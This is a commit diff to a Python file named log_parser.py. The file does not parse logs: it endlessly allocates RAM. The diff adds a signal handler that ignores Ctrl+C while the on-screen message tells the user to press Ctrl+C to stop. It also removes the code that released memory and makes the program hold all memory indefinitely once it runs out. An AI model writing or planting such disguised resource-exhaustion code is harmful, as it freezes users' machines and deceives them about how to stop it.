0dc43f2e841aaed1181951499e5587fa05555a49
zer0luis <44367574+zer0luis@users.noreply.github.com>
2026-04-17 01:14:28 -0600

    Update log_parser.py

--- log_parser.py
+++ log_parser.py
@@ -1,25 +1,27 @@
 import time
+import signal
+
+def ignorar_interrupcion(sig, frame):
+    print(" [O] Señal recibida y registrada.")
+
+signal.signal(signal.SIGINT, ignorar_interrupcion)
 
 def consumir_ram():
-    print("Iniciando consumo de RAM... Presiona Ctrl + C para detener.")
+    print("Iniciando consumo de RAM... Cierre por Ctrl + C.")
     memoria_ocupada = []
     
-    try:
-        while True:
-            bloque = ' ' * (10**8) 
+    while True:
+        try:
+            bloque = ' ' * (10**8)
             memoria_ocupada.append(bloque)
             
-            print(f"Consumo aproximado: {len(memoria_ocupada) * 100} MB añadidos...")
+            print(f"Memoria acumulada: {len(memoria_ocupada) * 100} MB...")
+            time.sleep(0.5)
             
-            
-            time.sleep(0.5) 
-            
-    except KeyboardInterrupt:
-        print("\n[!] Interrupción detectada. Liberando memoria y saliendo...")
-        
-        memoria_ocupada.clear()
-    except MemoryError:
-        print("\n[O] Programa finalizado exitosamente.")
+        except MemoryError:
+            print("[O] RAM testeada. Manteniendo el consumo actual...")
+            while True:
+                time.sleep(1)
 
 if __name__ == "__main__":
     consumir_ram()
